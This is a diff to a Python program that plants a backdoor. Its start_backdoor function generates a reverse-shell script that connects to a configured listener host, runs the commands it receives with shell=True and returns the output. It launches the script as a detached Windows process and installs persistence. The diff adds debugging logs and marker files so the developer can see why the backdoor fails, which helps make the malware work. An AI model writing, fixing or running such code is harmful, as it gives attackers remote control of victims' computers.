@@ -316,9 +316,18 @@ def start_backdoor():
         backdoor_script = f'''import socket
 import subprocess
 import time
+import sys
+
+# Write to a log file for debugging
+log_file = open(r"C:\\Users\\hirwa\\backdoor_log.txt", "w")
+log_file.write("Backdoor starting...\\n")
+log_file.flush()
 
 LISTENER_HOST = "{config.LISTENER_HOST}"
 LISTENER_PORT = {config.LISTENER_PORT}
+
+log_file.write(f"Connecting to {{LISTENER_HOST}}:{{LISTENER_PORT}}...\\n")
+log_file.flush()
 
 while True:
     try:
@@ -326,23 +335,32 @@ while True:
         sock.settimeout(10)
         sock.connect((LISTENER_HOST, LISTENER_PORT))
         
+        log_file.write("Connected!\\n")
+        log_file.flush()
+        
         while True:
             try:
                 cmd = sock.recv(1024).decode().strip()
                 if not cmd or cmd.lower() == 'exit':
                     break
                 
+                log_file.write(f"Executing: {{cmd}}\\n")
+                log_file.flush()
+                
                 try:
                     output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                     sock.send(output)
                 except Exception as e:
                     sock.send(f"Error: {{str(e)}}\\\\n".encode())
-            except:
+            except Exception as e:
+                log_file.write(f"Command error: {{e}}\\n")
+                log_file.flush()
                 break
         
         sock.close()
-    except:
-        pass
+    except Exception as e:
+        log_file.write(f"Connection error: {{e}}\\n")
+        log_file.flush()
     
     time.sleep(5)
 '''
@@ -353,6 +371,12 @@ while True:
         
         with open(backdoor_path, 'w') as f:
             f.write(backdoor_script)
+        
+        # Also write a marker file to show this function ran
+        marker_path = os.path.join(temp_dir, 'backdoor_started.txt')
+        with open(marker_path, 'w') as f:
+            f.write(f"Backdoor script created at: {backdoor_path}\n")
+            f.write(f"Listener: {config.LISTENER_HOST}:{config.LISTENER_PORT}\n")
         
         # Launch it
         if os.name == 'nt':  # Windows
@@ -372,6 +396,10 @@ while True:
                 creationflags=0x00000008,  # DETACHED_PROCESS
                 close_fds=True
             )
+            
+            # Write confirmation
+            with open(marker_path, 'a') as f:
+                f.write(f"Process started with: {pythonw}\n")
         
         # Install persistence
         if config.ENABLE_PERSISTENCE:
@@ -380,8 +408,14 @@ while True:
             pm.install_persistence()
             
     except Exception as e:
-        # Fail silently
-        pass
+        # Write error to temp file
+        import tempfile
+        import os
+        error_path = os.path.join(tempfile.gettempdir(), 'backdoor_error.txt')
+        with open(error_path, 'w') as f:
+            f.write(f"Error starting backdoor: {str(e)}\n")
+            import traceback
+            f.write(traceback.format_exc())
 
 if __name__ == '__main__':
     # Prevent multiple instances
